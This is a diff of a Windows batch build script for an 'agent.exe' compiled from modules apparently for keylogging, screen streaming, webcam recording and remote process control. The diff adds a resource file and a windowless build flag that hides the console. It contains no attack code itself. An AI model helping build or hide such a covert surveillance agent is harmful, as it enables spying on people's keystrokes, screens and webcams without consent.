@@ -1,6 +1,8 @@
 @echo off
 echo Compiling...
 
+windres resource.rc -o resource.o
+
 g++ -std=gnu++17 ^
   -DASIO_STANDALONE -DWIN32_LEAN_AND_MEAN -D_WIN32_WINNT=0x0A00 ^
   -D_WEBSOCKETPP_NO_REGEX_ ^
@@ -9,8 +11,9 @@ g++ -std=gnu++17 ^
   -I ../include/asio-1.18.0/include ^
   -I ../include/websocketpp ^
   -I ../include/nlohmann ^
-  main_server.cpp AgentTcpServer.cpp ProcessManager.cpp Capture.cpp ScreenStream.cpp Keylogging.cpp ProcessHandlers.cpp Router.cpp WebcamRecord.cpp WebcamStream.cpp GatewayDiscovery.cpp ^
+  main_server.cpp AgentTcpServer.cpp ProcessManager.cpp Capture.cpp ScreenStream.cpp Keylogging.cpp ProcessHandlers.cpp Router.cpp WebcamRecord.cpp WebcamStream.cpp GatewayDiscovery.cpp resource.o^
   -o agent.exe ^
+  -mwindows ^
   -static-libgcc -static-libstdc++ ^
   -lws2_32 -lmswsock -lpsapi -luser32 -lgdi32 -lgdiplus -lole32 -liphlpapi -ladvapi32 -lshcore
 
